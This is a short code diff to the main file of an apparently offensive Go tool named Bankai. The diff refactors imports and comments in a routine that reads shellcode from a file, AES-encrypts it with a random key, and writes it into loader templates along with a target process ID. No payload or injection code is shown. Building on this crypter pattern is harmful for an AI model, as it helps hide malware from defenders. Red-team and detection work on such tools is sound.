@@ -9,8 +9,9 @@ import (
 	"os/exec"
 	"time"
 
-	"github.com/bigb0sss/Bankai/crypter"
-	"github.com/bigb0sss/Bankai/utils"
+	"./crypter"
+	"./process"
+	"./readfile"
 )
 
 const (
@@ -123,13 +124,16 @@ func main() {
 	arch := opt.arch
 	pid := opt.pid
 
-	shellcodeFromFile := utils.readFile(inputFile)
+	// Reading shellcode from .bin
+	shellcodeFromFile := readfile.ReadShellcode(inputFile)
 
+	// Getting AES key
 	math.Seed(time.Now().UnixNano())
-	key := crypter.randKeyGen(32) //Key Size: 16, 32
+	key := []byte(crypter.RandKeyGen(32)) //Key Size: 16, 32
 	fmt.Printf("[INFO] Key: %v\n", string(key))
 
-	encryptedPayload := crypter.Encrypt([]byte(key), []byte(shellcodeFromFile))
+	// Payload encryption
+	encryptedPayload := crypter.Encrypt(key, []byte(shellcodeFromFile))
 	fmt.Println("[INFO] AES encrpyting the payload...")
 
 	// Creating an output file with entered shellcode
@@ -144,7 +148,7 @@ func main() {
 	vars["Shellcode"] = encryptedPayload
 	vars["Key"] = string(key)
 	vars["Pid"] = pid
-	r := utils.ProcessFile("templates/"+tmplSelect, vars)
+	r := process.ProcessFile("templates/"+tmplSelect, vars)
 
 	_, err = io.WriteString(file, r)
 	if err != nil {
